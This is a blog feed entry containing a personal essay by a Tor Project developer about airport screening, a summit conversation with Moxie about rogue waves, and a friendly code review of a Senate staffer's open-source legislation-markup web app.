&lt;a href="https://www.opentechfund.org/"&gt;Open Tech Fund&lt;/a&gt; summit meeting, I spotted
&lt;a href="https://thoughtcrime.org/"&gt;Moxie&lt;/a&gt; in the lobby through the glass doors; I ran
inside, dropping my backpack, and flung myself upwards at him to wrap my arms
around his shoulders. Moxie had been talking with two others: Trevor from the
&lt;a href="https://pressfreedomfoundation.org/"&gt;Freedom of the Press Foundation&lt;/a&gt;, and
Zooko of &lt;a href="https://tahoe-lafs.org/trac/tahoe-lafs"&gt;Tahoe-&lt;span class="caps"&gt;LAFS&lt;/span&gt;&lt;/a&gt;. I awkwardly
waved a friendly hello at Trevor, and since I&amp;#8217;d only &amp;#8220;met&amp;#8221; Zooko over
videochat before, I awkwardly hugged them for the first time. Inwardly, I
mentally kicked myself again for my shyness around people I should be able to
call comrades and cohorts, yet haven&amp;#8217;t interacted with as much &lt;span class="caps"&gt;AFK&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;We sat down in the hotel lobby, exhausted and idly chatting. Moxie and I, as
usual, got to one of our lifelong favourite&amp;nbsp;topics.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;So I was down in Malibu, and I ran into Laird Hamilton&amp;#8230; you know that
guy?&amp;#8221; Moxie&amp;nbsp;asked.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Yep. Dude surfs &lt;em&gt;crazy huge&lt;/em&gt; waves. I&amp;#8217;d run into him before. Moxie&amp;nbsp;continued:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;I just finished this book about rogue waves &amp;#8212; they&amp;#8217;re these monster waves,
hundreds of feet tall, pretty much unpredictable. There&amp;#8217;s whole conferences
that people go to &amp;#8212; people like us &amp;#8212; but instead of talking about crypto …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;The &lt;span class="caps"&gt;TSA&lt;/span&gt; agent had just finished running their fingers through my hair, and
begun to pat down my shoulders and outstretched&amp;nbsp;arms.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;So&amp;#8230; do you live in Washington D.C.?&amp;#8221; they&amp;nbsp;asked.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I shook my head, no. They asked what I was doing in the capitol. I responded,
in my politest, most innocent, most mousy-little-girl&amp;nbsp;voice:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;I&amp;#8217;m just going to talk to some of our nation&amp;#8217;s senators about my&amp;nbsp;work.&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The &lt;span class="caps"&gt;TSA&lt;/span&gt; agent jumped back a&amp;nbsp;bit.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Oh? What do you&amp;nbsp;do?&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;I&amp;#8217;m a programmer and computer security&amp;nbsp;researcher.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Oh! Are you like really smart? I saw things about this on &lt;span class="caps"&gt;TV&lt;/span&gt;. Do you like
break code and&amp;nbsp;stuff?&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Perhaps, sometimes. But, you know&amp;#8230; I can&amp;#8217;t really talk about&amp;nbsp;it.&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I forced my face into what I hoped was a kind and knowing&amp;nbsp;half-smile.&lt;/p&gt;
&lt;p&gt;They seemed utterly&amp;nbsp;shocked.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Well then, good luck with your talks, miss, and you&amp;#8217;re free to&amp;nbsp;go.&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;they said, forgetting to pat down the remainder of me, swab the baby blue
latex gloves, and put the swab into the machine that purportedly checks for
chemical compounds used in&amp;nbsp;explosives.&lt;/p&gt;
&lt;p&gt;I coolly walked away, holding my nose up in the air, as if I believed I had
every right in the world to not be humiliatingly groped, holding all my
snickering giddiness inside until I got around the corner of a head-high
dividing wall. Then I shook my head, shocked at myself and feeling somewhat
bad and for the multiple lies² that had just fallen out of my mouth before I
could even think about them, and I laughed out loud, wondering how long it
would take for that person to realise they still hadn&amp;#8217;t checked their&amp;nbsp;gloves.&lt;/p&gt;
&lt;p style="text-align: center; font-weight: bold;"&gt;&amp;middot &amp;middot&amp;nbsp;&amp;middot&lt;/p&gt;

&lt;p&gt;That evening, arriving at the hotel in Washington &lt;span class="caps"&gt;D.C.&lt;/span&gt; for the
&lt;a href="https://www.opentechfund.org/"&gt;Open Tech Fund&lt;/a&gt; summit meeting, I spotted
&lt;a href="https://thoughtcrime.org/"&gt;Moxie&lt;/a&gt; in the lobby through the glass doors; I ran
inside, dropping my backpack, and flung myself upwards at him to wrap my arms
around his shoulders. Moxie had been talking with two others: Trevor from the
&lt;a href="https://pressfreedomfoundation.org/"&gt;Freedom of the Press Foundation&lt;/a&gt;, and
Zooko of &lt;a href="https://tahoe-lafs.org/trac/tahoe-lafs"&gt;Tahoe-&lt;span class="caps"&gt;LAFS&lt;/span&gt;&lt;/a&gt;. I awkwardly
waved a friendly hello at Trevor, and since I&amp;#8217;d only &amp;#8220;met&amp;#8221; Zooko over
videochat before, I awkwardly hugged them for the first time. Inwardly, I
mentally kicked myself again for my shyness around people I should be able to
call comrades and cohorts, yet haven&amp;#8217;t interacted with as much &lt;span class="caps"&gt;AFK&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;We sat down in the hotel lobby, exhausted and idly chatting. Moxie and I, as
usual, got to one of our lifelong favourite&amp;nbsp;topics.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;So I was down in Malibu, and I ran into Laird Hamilton&amp;#8230; you know that
guy?&amp;#8221; Moxie&amp;nbsp;asked.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Yep. Dude surfs &lt;em&gt;crazy huge&lt;/em&gt; waves. I&amp;#8217;d run into him before. Moxie&amp;nbsp;continued:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;I just finished this book about rogue waves &amp;#8212; they&amp;#8217;re these monster waves,
hundreds of feet tall, pretty much unpredictable. There&amp;#8217;s whole conferences
that people go to &amp;#8212; people like us &amp;#8212; but instead of talking about crypto,
all they do is talk about rogue&amp;nbsp;waves.&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Moxie&amp;#8217;s eyes lit up as he&amp;nbsp;said,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Some people even survive these things&amp;#8230; but the folks who survive, they&amp;#8217;re
always the lunatics who saw the wall of water coming, and made a mad dash
straight for&amp;nbsp;it.&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I think the rest of us could sense one of Moxie&amp;#8217;s sailor stories coming, so we
smiled, nodded, and let him monologue. If someone were to follow Moxie around
and collect his
sometimes-rather-dubious-but-you&amp;#8217;re-willing-to-suspend-all-doubt-for-the-sheer-entertainment-value¹
sailor stories, they&amp;#8217;d have a &lt;span class="caps"&gt;NYT&lt;/span&gt; Best Seller in no&amp;nbsp;time.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;So this one wave, something like sixteen hundred feet high, hit the coast
of Alaska in the 1960s&amp;#8230; and there are still survivors alive today to tell
the tale. Can you imagine? Sitting there in the harbour, on your little
fishing boat, and you see a sixteen hundred foot wall of water coming
towards you, and you&amp;#8217;ve still got the wherewithal to jet the engines and
head directly into&amp;nbsp;it?&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Moment of silence in reverent&amp;nbsp;awe.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;This Laird Hamilton guy and his buddies, they get wind that sometimes, in
very special storms, this break called &amp;#8216;Jaws&amp;#8217; on the northside of Maui would
get up to one hundred&amp;nbsp;feet.&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Sure enough, one day, a storm hits, and Laird calls his buddy up: &amp;#8216;Dude,
it&amp;#8217;s happening, we gotta get out there!&amp;#8217; and so they grab a Jet Ski and a
surfboard, and sure enough: Jaws is breaking with hundred foot waves. His
buddy tows him in on the Jet Ski, and he begins the drop. At some point, he
realises: he&amp;#8217;s not falling; he&amp;#8217;s standing on a board on a vertical surface
of water, trying to drop in, but the wave is building so fast that while
trying to drop he&amp;#8217;s actually rising. So Laird panics, and bails by diving
out the back of the wave. When he surfaces, there&amp;#8217;s another monster wave
coming right for him. His friend Jet Skis in to grab him, but they wipe out
from the second wave, and Laird&amp;#8217;s buddy&amp;#8217;s leg is badly gashed open by the
razor sharp fins on the bottom of Laird&amp;#8217;s surfboard. He&amp;#8217;s already passed
out, bleeding out. There&amp;#8217;s often sharks in waters in this region. Laird rips
apart his wetsuit, making a tourniquet to try to stop the&amp;nbsp;bleeding.&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;As he jets towards the shore, holding onto his buddy, he takes a look
behind him, and there&amp;#8217;s a roaring, fifty-foot wall of pure whitewash from
the broken wave. They rush in to the shore, Laird packs his friend into an
ambulance, and more friends show up. They&amp;#8217;re not even sure if the friend who
had been driving the Jet Ski was going to make it. And you know what they&amp;nbsp;do?&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Moxie&amp;#8217;s eyes were fervently glowing like a right proper&amp;nbsp;madman.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;They go back out&amp;nbsp;there.&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I smiled my appreciation at Moxie&amp;#8217;s energetic storytelling, and sat quietly,
wondering if the similarities between the cypherpunks and these people
obsessed with giant waves extended beyond just the&amp;nbsp;conferences.&lt;/p&gt;
&lt;p style="text-align: center; font-weight: bold;"&gt;&amp;middot &amp;middot&amp;nbsp;&amp;middot&lt;/p&gt;

&lt;p&gt;I mentioned that I lied² multiple times to that &lt;span class="caps"&gt;TSA&lt;/span&gt;&amp;nbsp;agent.&lt;/p&gt;
&lt;p&gt;I don&amp;#8217;t³ work for any government agency. As hilarious as I think it is that
the &lt;span class="caps"&gt;TSA&lt;/span&gt; agent actually believed I worked for (presumably) the &lt;span class="caps"&gt;NSA&lt;/span&gt;, I
haven&amp;#8217;t. Nor have I worked for any other agency of the &lt;span class="caps"&gt;U.S.&lt;/span&gt; government, nor
any other&amp;nbsp;government.⁴&lt;/p&gt;
&lt;p&gt;And I also lied about visiting Congress. I&amp;#8217;ve already written about
&lt;a href="../congress-not-the-chaos-computer-club-kind.html"&gt;my previous experience visiting senators and representatives on Capitol Hill&lt;/a&gt;.
The head of &lt;span class="caps"&gt;OTF&lt;/span&gt; kindly poked me to attend their &amp;#8220;Hill Day&amp;#8221; again &amp;#8212; the yearly
field trip which led to those previously mentioned adventures, where a bunch
of crazy internet-freedom hackers go to Capitol Hill to explain their work to
&lt;span class="caps"&gt;U.S.&lt;/span&gt; senators, representatives, and their aides &amp;#8212; but seeing as there was
limited space for the Hill Day, I opted out of diving through that wave for
the second time in order to give someone else⁵ a go at&amp;nbsp;it.&lt;/p&gt;
&lt;p&gt;What I didn&amp;#8217;t realise was that many people had read my previous post and
expected Capitol Hill to be full of trolls. While this is mostly true, and
while I really, &lt;em&gt;really&lt;/em&gt; want to be able to say nothing more than that
Congress is full of a bunch of asshats who accidentally open their
&lt;code&gt;passwords.txt&lt;/code&gt; file on the monitor in front of me⁶, instead I&amp;#8217;d like to tell
the story of a positive interaction I had on that day two years&amp;nbsp;ago&amp;#8230;&lt;/p&gt;
&lt;p style="text-align: center; font-weight: bold;"&gt;&amp;middot &amp;middot&amp;nbsp;&amp;middot&lt;/p&gt;

&lt;p&gt;It was a full day, playing the part of a door-to-door salesman selling
censorship-circumvention and privacy software, like some futurist&amp;#8217;s worst
nightmare &amp;#8212; straight out of a Gibson or Doctorow novel &amp;#8212; trudging through
metal detectors and underground tunnels beneath the Rayburn House and other
Congressional office buildings, before I arrived in that Senator&amp;#8217;s office. I&amp;#8217;d
been busy spouting my well-rehearsed introductions to anyone important-looking
who would hold still for thirty seconds. I&amp;#8217;d entertained myself mostly by
snickering at the sheer abundance of ridiculous articles of clothing which I
was encountering &amp;#8212; a photograph of some of these things could have made a
tweet all in itself, perhaps complemented, drily, wittily, writhingly, by the
simplicity of a &lt;code&gt;#wtf&lt;/code&gt; or a &lt;code&gt;#onlyindc&lt;/code&gt; hashtag: American flag high heels,
pink and baby blue powersuits, and chintzy red-white-and-blue 1970s-styled
silk&amp;nbsp;neckties.&lt;/p&gt;
&lt;p&gt;And, of course, the entertainment value provided by pretending to be
legitimately concerned over the rumoured possibility of Reptilians in the
underground tunnels of the nation&amp;#8217;s capitol should not be left unstated. I
kept my eyes very widely and very noticeably peeled, such that any casual
observer or surveillance camera which might happen to spy on me in those
tunnels couldn&amp;#8217;t help but &lt;em&gt;instantly&lt;/em&gt; understand that I was comprised of
nothing but the most utmost awareness of my surrounding environment: a single
glimpse of a scaly green tail whisking around a corner, a set of pupils
converting to the yellowy narrowed slits of a reptile in between blinks, the
slightest hiss from an underground chamber whose door was mistakenly left
unlatched &amp;#8212; I would make certain that any secrets that were down here,
&lt;em&gt;they&amp;#8217;d know&lt;/em&gt; that &lt;em&gt;I knew&lt;/em&gt; about&amp;nbsp;them.&lt;/p&gt;
&lt;p&gt;The Senator&amp;#8217;s office reeked of Folgers coffee, clean carpets, and
paperwork. We walked in, greeted by a tall, Texan man in his mid-twenties. He
was dressed in faded Levi&amp;#8217;s and a plaid flannel shirt. His biceps said he&amp;#8217;d
once quarterbacked for the high-school football team. My first thought&amp;nbsp;was,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Oh, fuck me. Today&amp;#8217;s gonna end with me hitting this dude in the&amp;nbsp;face.&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Our funder had split all us hackers up into smaller groups that morning. As
should be expected from anyone familiar with the normative ratios in hacker
circles, I was the only female-bodied person in my group, which neither
bothered⁷ me nor surprised me in the slightest. It&amp;#8217;s just a&amp;nbsp;FactOfLife™.⁸&lt;/p&gt;
&lt;p&gt;What did surprise me was this plaided Texan. Speaking directly to me, he&amp;nbsp;said,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Hi! You must be Isis, from the Tor Project. I&amp;#8217;m a big fan of your&amp;nbsp;work!&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A bit shocked that anyone from Texas had heard of either me or the Tor
Project, I thanked him and shook his hand. Some other members of the group
tried to introduce themselves. He shushed them with a handwave and continued
speaking directly to&amp;nbsp;me:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;So&amp;#8230; you write Python, yeah? And, of course, you&amp;#8217;re really good with
security&amp;#8230; I&amp;#8217;m releasing this web app for the Senator tomorrow, and I&amp;#8217;m
really nervous about it and kinda wondering if you could take a look at my&amp;nbsp;code?&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Inside my brain, there were some noises like frantic footsteps on a hardwood
floor and some confused shuffling of papers, and then a chorus of voices all
saying in unison: &lt;em&gt;&amp;#8220;Wat.&amp;#8221;&lt;/em&gt; This kid? Write&amp;nbsp;code?&lt;/p&gt;
&lt;p&gt;Sceptical, I followed, sitting in the mahogany leather chair studded with
brass rivets he had pointed me into, next to him, behind a giant,
darkly-stained oak desk. His Macbook was sitting open on the desk. A couple of
Vim buffers lay open before me. I hated &lt;em&gt;absolutely everything&lt;/em&gt; he stood&amp;nbsp;for.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;It&amp;#8217;s a perhaps a little bit late for an audit, if you&amp;#8217;re deploying
tomorrow.&amp;#8221; I&amp;nbsp;warned.&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Well, it&amp;#8217;s already live on the server&amp;#8230; it&amp;#8217;s just that we decided to
open-source it, so I&amp;#8217;m making it public on Github&amp;nbsp;tomorrow.&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I stared at his cowboy boots. Two of the voices in my brain were whispering
back and forth to each&amp;nbsp;other:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Open&amp;nbsp;source?&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Did he just say &amp;#8216;open&amp;nbsp;source&amp;#8217;?&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;I dunno&amp;#8230; we probably just misheard&amp;nbsp;him.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Perhaps he meant &amp;#8216;Congress is a bunch of open sores&amp;#8217;&amp;#8230;&amp;nbsp;?&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;My own inner-voice interrupted, telling them to &lt;span class="caps"&gt;STFU&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;One of the other hackers from the group tried to introduce themselves and
their project again. More handwaving from the plaided Texan. Silence&amp;nbsp;again.&lt;/p&gt;
&lt;p&gt;We started looking over the code, a mixture of Python, Django templates, and
Javascript. I pointed out a bunch of little things as I spotted them, like
moving to a more recent version of Django to better avoid
&lt;a href="http://www.cvedetails.com/vulnerability-list/vendor_id-10199/product_id-18211/year-2011/Djangoproject-Django.html"&gt;some of the then-recent &lt;span class="caps"&gt;CSRF&lt;/span&gt;, &lt;span class="caps"&gt;XSS&lt;/span&gt;, and DoS vulnerabilities&lt;/a&gt;. I
complimented him on his clean use of Javascript scopes and avoidance of global
variable manipulation, pointed out some places where perhaps the Python code
could be more functionalised to avoid code duplication, and suggested adding a
bit more developer documentation and recommended trying
&lt;a href="http://sphinx-doc.org/"&gt;Sphinx&lt;/a&gt;. Just little things. Overall, it looked
pretty&amp;nbsp;good.&lt;/p&gt;
&lt;p&gt;The whole time, he was kind and patient when I appeared to misunderstand
something, intelligent in his explanations for particular segments of code and
rationales for overarching design choices, and slightly &lt;em&gt;nervous&lt;/em&gt;, as if he
was sincerely worried that I might find some issue and rail against him for
writing shitty, insecure code. He wasn&amp;#8217;t just showing off his
perfectly-cultivated pet project to me to try get attention. Even more
impressive: he spoke directly &lt;em&gt;with me&lt;/em&gt; the entire time. In a room full of
boys. Boys who concern themselves primarily with coding and security, no
less. And &amp;#8212; not to be misandrist &amp;#8212; boys who continually tried to interrupt
the conversation to provide their own input (which, I should add, was more
than welcome on my end&amp;#8230; after all, it&amp;#8217;s possible I&amp;#8217;d missed something). In a
good way, I was shocked. And impressed. And then further shocked at myself
that I was&amp;nbsp;impressed.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;So&amp;#8230; this is some sort of app for collaborative editing, like a wiki,&amp;nbsp;right?&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I probingly asked out of curiosity, wondering why anyone would feel the need
to reinvent &lt;em&gt;that&lt;/em&gt; particular wheel&amp;nbsp;again.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Yep! It&amp;#8217;s a site which allows members of Congress to upload proposed
legislature for the public to collaboratively edit, mark up, and make
suggestions for. Experts too can point out new and relevant research in
their fields which might be pertinent to the amendment and creation of laws,
lawyers can highlight sections which are confusingly or troublingly worded,
and anyone can voice their opinions.&amp;#8221; he&amp;nbsp;explained.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I thought of bills like &lt;span class="caps"&gt;SOPA&lt;/span&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;Hmm&amp;#8230; so if someone were to login, click to edit a bill, highlight the whole
text input field, hit &lt;span class="caps"&gt;BACKSPACE&lt;/span&gt;, and then click &lt;span class="caps"&gt;SAVE&lt;/span&gt;&amp;#8230; what would that&amp;nbsp;do?&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;He cocked his head sideways and stared at me inquisitively. &lt;em&gt;&amp;#8220;That&amp;#8230; would
create a revision&amp;#8230; in which the whole bill would be erased.&amp;#8221;&lt;/em&gt; he answered,
slowly, seemingly not understanding why someone might wish to make such a
political&amp;nbsp;statement.&lt;/p&gt;
&lt;p&gt;We got to talking about login and authentication schemes, and, in some sense,
matters of identity. Who should be permitted to edit this legislature?
Currently implemented mechanisms were, of course, poorly-designed and
insufficient to prove requisite authorisation to edit a proposed bill. And
even worse in the case that such a system were to be used for smaller scales,
like state or city legislature. Requiring an image of a &lt;span class="caps"&gt;U.S.&lt;/span&gt; passport or
state-issued driver&amp;#8217;s licence would pose enormous data-retention and privacy&amp;nbsp;issues.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;But is there actually crypto that can do authentication like that safely?&amp;#8221;
he&amp;nbsp;asked.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I remember that, somehow, through a series of questions and answers, I wound
up explaining things like Bitcoin&amp;#8217;s demonstrated solution to the consensus
issues posed by the Byzantine General&amp;#8217;s Problem, the basics of some of
&lt;a href="https://people.torproject.org/~isis/papers/rBridge:%20User%20Reputation%20based%20Tor%20Bridge%20Distribution%20with%20Privacy%20Preservation.copy%20with%20notes.pdf"&gt;my favourite anonymous credential schemes&lt;/a&gt;,
and how such schemes combined might someday be used to create anonymous
electronic identification cards for a system of global, opt-in,
techno-panarchist&amp;nbsp;States:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span class="dquo"&gt;&amp;#8220;&lt;/span&gt;So, for example, you could be a member of the Republican State, protected
by it and paying taxes to it, regardless of where you live, travel, or work.
You&amp;#8217;d be free to discuss and vote on issues anonymously, truly speaking your
mind, unhindered by any worries that your political views might one day
become unsavoury and be used against you. And conversely, someone like me: I
would be able to opt-in (or out) of whichever State, or collective
association, as I saw fit, and be taxed accordingly for my use of whatever
public services I&amp;#8217;d signed up for. Most importantly, each person could have
strong, cryptographic protection of their identity, their associations, and
perhaps even proof that they had payed whatever taxes they had opted&amp;nbsp;into.&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I remember shyly looking up from the stitched patterns on his cowboy boots at
this point, slightly embarrassed that so many words which might easily
convince someone that I was mentally unstable had poured out of my mouth. And
I remember the look on the Texan hacker&amp;#8217;s face: eyes wide, head tilted again
to the side, mouth agape, &lt;em&gt;mind completely blown&lt;/em&gt;. He said nothing. He
continued to say nothing, and it seemed like this was probably going to take
him a&amp;nbsp;while.&lt;/p&gt;
&lt;p&gt;This was painful. I really liked this guy. And I absolutely &lt;em&gt;hated&lt;/em&gt; that I
couldn&amp;#8217;t help liking him. I wanted to hate him, goddammit. He was like, you
know, &lt;em&gt;the enemy&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;But so what if maybe he didn&amp;#8217;t understand my crazy-anarchist politics or my
decision to never brush my hair and grow dreads down to my knees? I didn&amp;#8217;t
agree with his Macbook or understand how he could maintain any typing accuracy
with his bulgy quarterback biceps. But differences aside, this guy was a good
coder, was extremely respectful of female-bodied people and willing to engage
them on a technical level, and was willing to write a web app which permitted
&amp;#8212; as ineffectual as I suspect such a statement would be &amp;#8212; people like me to
voice their opinions, publicly and&amp;nbsp;equally.&lt;/p&gt;
&lt;p&gt;I guess I suppose &lt;em&gt;grumble&lt;/em&gt; that maybe there are &lt;em&gt;grumble&lt;/em&gt; a few decent people
&lt;em&gt;grumble&lt;/em&gt; on Capitol&amp;nbsp;Hill.&lt;/p&gt;
&lt;p&gt;For what it&amp;#8217;s worth, I don&amp;#8217;t remember the name of the plaided Texan I spoke
with on that day two years ago, so please correct me if I&amp;#8217;m wrong, but I
strongly suspect that it was &lt;a href="https://github.com/jcarbaugh"&gt;Jeremy Carbaugh&lt;/a&gt;
of the &lt;a href="http://sunlightfoundation.com/team/jcarbaugh/"&gt;Sunlight Foundation&lt;/a&gt;,
and that the web app in question was
&lt;a href="http://www.publicmarkup.org/"&gt;PublicMarkup&lt;/a&gt;,
&lt;a href="https://github.com/sunlightlabs/publicmarkup"&gt;the code for which is available on Github&lt;/a&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;p style="font-size: 80%"&gt;¹ I&amp;#8217;m thinking specifically the one with the cop
trying to arrest Moxie for carrying a closed wine bottle onto a sailboat in a
harbour, while an ongoing Navy exercise in the water is using trained
dolphins strapped with explosives to rocket a scuba-driving Navy Seal out of
the water and up into the air, where other Navy Seals on a boat practice
gunning him&amp;nbsp;down.&lt;/p&gt;

&lt;p style="font-size: 80%"&gt;² Upon proofreading this post, a friend suggested
that I not retroactively &amp;#8220;misterm&amp;#8221; actions which were not, legally speaking
&amp;#8220;lying&amp;#8221; &lt;i&gt;per se&lt;/i&gt;, in a way which could potentially be considered an
admission of the crime of lying to a federal agent, and suggested that I
should instead say that &amp;#8220;I insinuated misinformation to the &lt;span class="caps"&gt;TSA&lt;/span&gt; agent.&amp;#8221; While
I &lt;i&gt;am&lt;/i&gt; slightly anxious about making a blog post containing what could be
construed as an admission to a crime which I didn&amp;#8217;t commit&amp;#8230; on the other
hand &amp;#8212; because I can&amp;#8217;t say the phrase &amp;#8220;insinuated misinformation&amp;#8221; with a
straight face without making an IngSoc doublespeak reference &amp;#8212; I&amp;#8217;m going to
leave my post&amp;nbsp;as-is.&lt;/p&gt;

&lt;p style="font-size: 80%"&gt;³ Unless, of course, you&amp;#8217;re one of the rather
annoyingly naïve conspiracy theorist assholes who just got on the Internet for
the first time to write drivel for &lt;a
href="http://pando.com/2014/07/16/tor-spooks/"&gt;Pando&lt;/a&gt;, and you happen to
count contracting to non-profits like the &lt;a href="https://leap.se/"&gt;&lt;span class="caps"&gt;LEAP&lt;/span&gt;
Encryption Access Project&lt;/a&gt; and the &lt;a href="https://www.torproject.org"&gt;Tor
Project&lt;/a&gt; as somehow &amp;#8220;working for the &lt;span class="caps"&gt;U.S.&lt;/span&gt; government&amp;#8221;, despite both projects
&lt;a href="https://www.torproject.org/about/financials.html.en"&gt;being very clear
about whom they receive grant funding from and for what purposes&lt;/a&gt;.&lt;/p&gt;

&lt;p style="font-size: 80%"&gt;⁴ And following &lt;a
href="https://lists.torproject.org/pipermail/tor-relays/2012-May/001344.html"&gt;Mike
Perry&amp;#8217;s frequent examples&lt;/a&gt;, I&amp;#8217;d also like to take this opportunity to hold
my &lt;i&gt;I&amp;#8217;ve-never-received-a-National-Security-Letter&lt;/i&gt; card high in the air
while I still can.

&lt;p style="font-size: 80%"&gt;⁵ I hear that Mike Perry enjoys getting his feet
wet. Perhaps he&amp;#8217;ll write something about&amp;nbsp;it.&lt;/p&gt;

&lt;p style="font-size: 80%"&gt;⁶ Story for another&amp;nbsp;time.&lt;/p&gt;

&lt;p style="font-size: 80%"&gt;⁷ Because I can hear the other feminists yelling at
me as I write this: by &amp;#8220;not bothered&amp;#8221; I mean that &amp;#8220;I&amp;#8217;ve become much too much
accustomed to this to feel personally offended at this particular&amp;nbsp;incident.&amp;#8221;
&lt;/p&gt;

&lt;p style="font-size: 80%"&gt;⁸ Where the word &amp;#8220;life&amp;#8221; is instead taken to mean
&amp;#8220;the current deranged sociocultural arrangement in which female persons are
coerced in innumerable ways to assume that they are intrinsically ill-adept
w.r.t. skills in various technologies, sciences, and other areas of interest
and study which are commonly considered by those afflicted with &lt;a
href="http://womensenews.org/story/books/120323/women-were-first-computer-programmers"&gt;Historiological
Retrograde Amnesia&lt;/a&gt; to have &amp;#8216;always been&amp;#8217; primarily&amp;nbsp;male.&amp;#8221;&lt;/p&gt;</content><category term="travel"></category><category term="Tor"></category></entry><entry><title>Replacing a Thinkpad X60 Bootflash Chip:</title><link href="https://blog.patternsinthevoid.net/replacing-a-thinkpad-x60-bootflash-chip.html" rel="alternate"></link><published>2014-01-10T15:29:00+00:00</published><updated>2015-11-03T15:48:13+00:00</updated><author><name>isis agora lovecruft</name></author><id>tag:blog.patternsinthevoid.net,2014-01-10:/replacing-a-thinkpad-x60-bootflash-chip.html</id><summary type="html">&lt;h1&gt;Using coreboot to directly initialise a Linux kernel&amp;nbsp;payload&lt;/h1&gt;
